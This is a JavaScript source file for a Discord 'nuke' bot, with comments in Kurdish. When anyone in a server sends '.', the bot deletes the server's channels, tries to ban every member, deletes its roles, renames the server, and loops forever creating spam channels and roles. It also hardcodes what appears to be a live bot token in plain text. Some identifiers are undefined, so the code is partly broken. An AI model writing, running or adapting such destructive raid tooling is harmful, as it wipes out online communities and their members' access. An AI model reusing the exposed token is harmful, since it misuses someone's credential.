const Discord = require("discord.js");
const client = new Discord.Client();
const prefix = ".";
client.on("message", message => {
  if (message.content === ".") {
    if (message.channel.guild) {
      message.guild.channels.forEach(c => {
        if (c.deletable) {
          c.delete();
        }
      });
      message.guild.members.forEach(m => {
        m.ban(Salm1);
      });
      message.guild.roles.forEach(r => {
        r.delete(Salm);
      });
      message.guild.setName("Salm Up");////nawek dane bo sar server 
      setInterval(function() {
        message.guild.createChannel("Salm Up", "text");///////bo channel 
        message.guild.createChannel("Salm Up", "voice");////bo voice
        message.guild.createRole({ name: "Salm Up" });////nawek dane bo role kan
      });
    }
  }
});

client.login("OTgyOTk5MzA3NTg0MTQzNDAw.Gbtpdb.SwP9JKnTmzIoa4wsFuorpopTQnLakZZS8WOdyc")
